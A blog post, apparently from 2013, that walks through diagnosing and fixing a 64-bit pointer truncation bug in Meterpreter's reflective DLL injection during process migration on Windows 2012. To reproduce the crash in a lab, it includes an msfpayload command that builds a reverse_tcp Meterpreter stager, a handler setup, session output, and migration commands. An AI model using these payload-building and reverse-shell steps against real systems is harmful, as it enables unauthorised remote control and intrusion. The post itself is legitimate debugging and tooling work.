---
categories:
- Security
- RCE
- Open Source
- Windows
comments: true
date: 2013-09-14T00:00:00Z
title: 64bit Pointer Truncation in Meterpreter
---

If you haven't ever heard of [Meterpreter][met_native] before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the [Metasploit Framework][] and can be used to give you tremendous power and control over target machines during a [penetration test][]. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is [open source][msf_source]!

I'm currently in the very fortunate position of [working with the crew][r7_blog] from [Rapid7][] to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I'm on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven't had the bandwidth to fix.  These people are super-smart, and super-nice and I'm honoured that I've been selected to work alongside them.

The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.

<!--more-->

Meterpreter Basics
------------------

When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.

Once you have an instance of Metepreter running on a target, you've got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone's noodle, the thing that blows my mind the most is Meterpreter's ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing `migrate <process id>` at the Meterpreter prompt is all it takes.

There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process's memory otherwise the migration will not succeed.

Meterpreter comes in quite a few flavours, including `PHP`, `Python`, and `native/C` for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.

We'll be focusing on the Windows native payload in this post, and in particular we'll be looking at how Meterpreter is loaded and executed.

Reflective DLL Injection
------------------------

Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:

* Position-independence.
* Lack of host system registration.
* Largely undetectable on the target at both a system and process level.

The canonical paper \[[PDF][rdi_paper]\], written by [Stephen Fewer][], is well worth reading and can be found on the [Harmony Security][] website. Read it. It's amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there's a multi-stage process involved which includes:

* Writing the code to an executable area of memory.
* Executing the loader which creates a valid DLL image in memory.
* Calling [DllMain][] on the loaded DLL.
* Returning control to the process that invoked it.

With that in mind, let's take a look at the bug.

The Bug
-------

The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):

> Trying to migrate Metepreter between processes on Windows 2012 seems to be
> unreliable. It will migrate just fine into some processes, such as _explorer.exe_,
> without any problems. However, spawning another process, such as _notepad.exe_, and
> migrating to it hangs the entire session. Migrating to the _winlogon.exe_ process
> crashes the entire user environment on the target host.

When I first read this report I thought "Wow, how am I going to track this down?", and I'll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it's been a long time since I'd been tasked with something this challenging and so, deep down, I was looking forward to diving in.

Replication
-----------

The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn't a problem.

After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.

Creating a payload to do this is really simple thanks to [msfpayload][] (part of Metasploit). On my [Backtrack][] VM I used the following command to generate the PE image:

    root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X > 40-443-x64.exe

This command creates a 64-bit Windows executable that contains a small stager. This stager connects to `10.5.26.40` (my Backtrack VM) on port `443` (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.

I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run `msfconsole` and set it up to use `multi/handler` with the appropriate settings, like so:

    msf exploit(handler) > show options

    Module options (exploit/multi/handler):

       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------


    Payload options (windows/x64/meterpreter/reverse_tcp):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique: seh, thread, process, none
       LHOST     10.5.26.40       yes       The listen address
       LPORT     443              yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Wildcard Target

With those settings in place, the exploit was ready to fire:


    msf exploit(handler) > exploit

    [*] Started reverse handler on 10.5.26.40:443 
    [*] Starting the payload handler...

From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:

    [*] Sending stage (951296 bytes) to 10.5.26.30
    [*] Meterpreter session 1 opened (10.5.26.40:443 -> 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000

    meterpreter > getuid
    Server username: WIN-URCAUVPE291\OJ Reeves
    meterpreter > sysinfo
    Computer        : WIN-URCAUVPE291
    OS              : Windows 2012 (Build 9200).
    Architecture    : x64
    System Language : en_US
    Meterpreter     : x64/win64
    meterpreter > 

Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to `explorer.exe` and see if anything changed:


    meterpreter > ps

    Process List
    ============

     PID   PPID  Name                Arch    Session     User                       Path
     ---   ----  ----                ----    -------     ----                       ----
     0     0     [System Process]            4294967295                             
     4     0     System                      4294967295                             
     444   4     smss.exe                    4294967295                             
     484   708   svchost.exe                 4294967295                             
     536   524   csrss.exe                   4294967295                             
     604   596   csrss.exe                   4294967295                             
     612   524   wininit.exe                 4294967295                             
     640   596   winlogon.exe                4294967295                             
     692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
     708   612   services.exe                4294967295                             
     716   612   lsass.exe                   4294967295                             
     804   708   svchost.exe                 4294967295                             
     816   708   svchost.exe                 4294967295                             

    ... snip ...

    meterpreter > migrate 692
    [*] Migrating from 1508 to 692...
    [*] Migration completed successfully.
    meterpreter > getuid
    Server username: WIN-URCAUVPE291\OJ Reeves
    meterpreter > sysinfo
    Computer        : WIN-URCAUVPE291
    OS              : Windows 2012 (Build 9200).
    Architecture    : x64
    System Language : en_US
    Meterpreter     : x64/win64
    meterpreter > 

Migration seemed to work. Next I tried the failure case. First I launched `notepad.exe` and then attempted to migrate to it:

    meterpreter > execute -f notepad.exe -t -H
    Process 192 created.
    meterpreter > migrate 192
    [*] Migrating from 692 to 192...
    [-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
    meterpreter >

The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.

Diagnosis
---------

To help figure out what was going wrong, I enlisted the help of two of my favourite tools: [DebugView][] and [Windbg][]. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you'll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the [Debugging Tools for Windows][dbg_tools] so that the right version of `windbg` was available.

Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched `notepad.exe` manually and attached to it from `windbg` prior to performing the migration. I left `DebugView` running as well to catch any debug messages from processes outside of the one that `windbg` was attached to.

Upon running the `migrate` command `notepad.exe` crashed and `windbg` caught the exception. This is what it showed:

    (ab0.448): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    00000000`707a7b5c ??              ???

We can see that we're accessing memory that we shouldn't be accessing. But why?

    0:003> !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Exception Analysis                                   *
    *                                                                             *
    *******************************************************************************


    FAULTING_IP: 
    unknown!printable+0
    00000000`707a7b5c ??              ???

    EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
    ExceptionAddress: 00000000707a7b5c
       ExceptionCode: c0000005 (Access violation)
      ExceptionFlags: 00000000
    NumberParameters: 2
       Parameter[0]: 0000000000000008
       Parameter[1]: 00000000707a7b5c
    Attempt to execute non-executable address 00000000707a7b5c

    ... snip ...

The migration process results in an attempt to execute a section of code in an area of memory that isn't marked as executable. Let's confirm that:

    0:003> !vprot 00000000707a7b5c
    BaseAddress:       00000000707a7000
    AllocationBase:    0000000000000000
    RegionSize:        000000000f839000
    State:             00010000  MEM_FREE
    Protect:           00000001  PAGE_NOACCESS

As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:

    0:003> du 00000000707a7b5c
    00000000`707a7b5c  "????????????????????????????????"
    00000000`707a7b9c  "????????????????????????????????"
    00000000`707a7bdc  "????????????????????????????????"
    00000000`707a7c1c  "????????????????????????????????"
    00000000`707a7c5c  "????????????????????????????????"
    00000000`707a7c9c  "????????????????????????????????"
    00000000`707a7cdc  "????????????????????????????????"
    00000000`707a7d1c  "????????????????????????????????"
    00000000`707a7d5c  "????????????????????????????????"
    00000000`707a7d9c  "????????????????????????????????"
    00000000`707a7ddc  "????????????????????????????????"
    00000000`707a7e1c  "????????????????????????????????"

It's pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.

Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with [OutputDebugString][] calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up `DebugView` on the Windows 2012 VM and repeated the process (including attaching to `notepad.exe` with `windbg`). Here's a snippet of the output:

    [SERVER] Initializing...
    [SERVER] module loaded at 0x350B0000
    [SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
    [SERVER] Using SSL transport...
    [SERVER] Initializing tokens...
    [SERVER] Flushing the socket handle...
    [SERVER] Initializing SSL...
    [SERVER] Negotiating SSL...
    ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
    ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
    ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
    ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
    ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
    ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
    [SERVER] Sending a HTTP GET request to the remote side...
    [SERVER] Completed writing the HTTP GET request: 27
    [SERVER] Registering dispatch routines...
    Registering a new command (core_loadlib)...
    Allocated memory...
    Setting new command...
    Fixing next/prev...
    Done...
    [SERVER] Entering the main server dispatch loop for transport 0...
    [DISPATCH] entering server_dispatch( 0x334D7B60 )
    [SCHEDULER] entering scheduler_initialize.
    [SCHEDULER] leaving scheduler_initialize.
    [DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
    [COMMAND] Processing method core_loadlib
    [COMMAND] core_loadlib: Entry
    [COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
    [COMMAND] core_loadlib: lib does not exist locally (being uploaded)
    [COMMAND] core_loadlib: lib is not to be stored on disk
    [LOADLIBRARYR] starting
    [LOADLIBRARYR] GetReflectiveLoaderOffset
    [LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
    [LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
    [LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
    ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
    ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
    ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
    ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
    [LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
    (9b8.968): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    00000000`33449bec ??              ???

The extra debug calls that I added to the source are those marked with `[LOADLIBRARYR]`. These calls were located in the guts of the reflective DLL injection code.

As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called `ReflectiveLoader()` and is invoked in code via a pointer called `pReflectiveLoader`, which you can see in the above output. At the end of the `ReflectiveLoader()` function, a reference to `DllMain()` is resolved and invoked directly prior to returning control to the caller.

Once this function returns, the Meterpreter-specific code then calls `DllMain()` again, using the value returned from `ReflectiveLoader()`, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to `DllMain()` called `pDllMain`, and this is the pointer that's used to make the call.

What was interesting about the log is that the first call to `DllMain()` that is invoked in the body of `ReflectiveLoader()` worked fine, otherwise the process would have crashed prior to the line that outputs the value of the `pDllMain` variable. Instead, it was the _second_ call to `DllMain()` via the `pDllMain` pointer that caused the crash. This implied that the memory address that was being returned from `ReflectiveLoader()` was incorrect.

The nature of the reflective loading mechanism implied to me that the addresses of `pReflectiveLoader` and `pDllMain` should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:

    [LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
    [LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)

Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the `pDllMain` pointer appeared to have lost its higher-order [DWORD][]. The pointer had in fact been truncated!

But why? It wasn't immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the `pReflectiveLoader` value was used as the higher-order DWORD of `pDllMain` as well. The hack looked something like this:

```
ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) & (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
```

After the above code, `pDllMain` would have the same higher-order DWORD value as `pReflectiveLoader`. I compiled, deployed, executed ...

... and it worked!

Resolution
----------

Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from `ReflectiveLoader()`, so why was it truncated upon return?

I spent quite a bit of time looking around, and I didn't find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr [Stephen Fewer][]. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.

It didn't take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a [pull request][sf_pr] to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!

When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.

So what was it?

The `pReflectiveLoader` pointer is a function pointer of a type defined like so:

```
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
```

However, the `ReflectiveLoader()` function was defined in the source like so:

```
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
    // ... snip ...
}
```

So the function returns a [ULONG_PTR][] (which is 64-bits) but the function pointer type returned a [DWORD][] (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of `pDllMain`. The fix was to simply change the return type of the function pointer to match:

```
typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
```

Problem solved.

Extra Thoughts and Conclusion
-----------------------------

For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of [ASLR][]. To quote Stephen:

> The bug was triggering on Server 2012 but not other 64bit systems
> probably due to high entropy ASLR making allocations over the 4gig boundary.

Earlier versions of Windows didn't have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.

This was a really fun bug to analyse and track down. I'm glad we got to the bottom of it. Again I'd like to thank Stephen for his involvement in locating the source of the problem.

The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.  <a name="Edit15thSep"></a>

Edit 15th September
-------------------

Today on Twitter [Luke Imhoff][KronicDeth] asked me a good question:

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/TheColonial">@TheColonial</a> why didn&#39;t the compiler issue a truncation warning?</p>&mdash; Luke Imhoff (@KronicDeth) <a href="https://twitter.com/KronicDeth/statuses/378878334249095168">September 14, 2013</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

I answered quickly but realised after that I was a bit hasty, so I'm going to clarify on here instead.

We need to review a few snippets of code to understand why the compiler didn't complain. Firstly, the function-pointer type definition (prior to the fix):

```
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
```

Second, the declaration of the `ReflectiveLoader()` function:

```
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
   // ... snip ...
}
```

Third, the declaration of both `pDllMain` and `pReflectiveLoader`:

```
REFLECTIVELOADER pReflectiveLoader = NULL;
DLLMAIN pDllMain                   = NULL;
```

Finally, the actual calls that use these pointers:

```
pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
// ... snip ...
pDllMain = (DLLMAIN)pReflectiveLoader();
```

As we can see, `pReflectiveLoader` is set via a cast from a `UINT_PTR` type, which maps to the right sized pointer for whatever platform it's compiled on. Casting a `UINT_PTR` to a `REFLECTIVELOADER` type doesn't change the size.

At first I though the reason there was no compiler warning was because the result of calling `pReflectiveLoader` was cast to a `DLLMAIN` type, effectively hiding the problem, but that's not correct. If `pDllMain` was just a `ULONG_PTR` instead of `DLLMAIN` and no casting was used it still wouldn't have resulted in a problem because the return type of `REFLECTIVELOADER` is _smaller_, and hence an implicit cast would have turned this into a 64-bit value without complaining. The truncation has already happened because of the incorrect return type of `REFLECTIVELOADER`.

Ultimately the problem is down to the disconnect between the function pointer type and the function implementation type.

Thanks for the great question Luke.

  [KronicDeth]: https://twitter.com/KronicDeth "Luke Imhoff @ Twitter"
  [met_native]: https://github.com/rapid7/meterpreter "Native Meterpreter"
  [Metasploit framework]: http://www.metasploit.com/ "Metasploit Framework"
  [penetration test]: http://en.wikipedia.org/wiki/Penetration_test "Penetration Testing"
  [msf_source]: https://github.com/rapid7/metasploit-framework/ "Metasploit Framework Source"
  [Rapid7]: http://www.rapid7.com/ "Rapid 7"
  [r7_blog]: https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update "Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!"
  [rdi_paper]: http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf "Reflective DLL Injection"
  [Harmony Security]: http://harmonysecurity.com/ "Harmony Security"
  [Stephen Fewer]: http://twitter.com/stephenfewer
  [DllMain]: http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx "DllMain Entry Point"
  [msfpayload]: http://www.offensive-security.com/metasploit-unleashed/Msfpayload "msfpayload"
  [Backtrack]: http://www.backtrack-linux.org/ "Backtrack Linux"
  [DebugView]: http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx "DebugView"
  [Windbg]: http://en.wikipedia.org/wiki/WinDbg "Windbg"
  [dbg_tools]: http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx "Debugging Tools for Windows"
  [OutputDebugString]: http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx "OutputDebugString function"
  [DWORD]: http://msdn.microsoft.com/en-us/library/cc230318.aspx "DWORD"
  [ULONG_PTR]: http://msdn.microsoft.com/en-us/library/cc230394.aspx "ULONG_PTR"
  [ASLR]: http://en.wikipedia.org/wiki/Address_space_layout_randomization "Adress Space Layout Randomisation"
  [sf_pr]: https://github.com/rapid7/meterpreter/pull/14
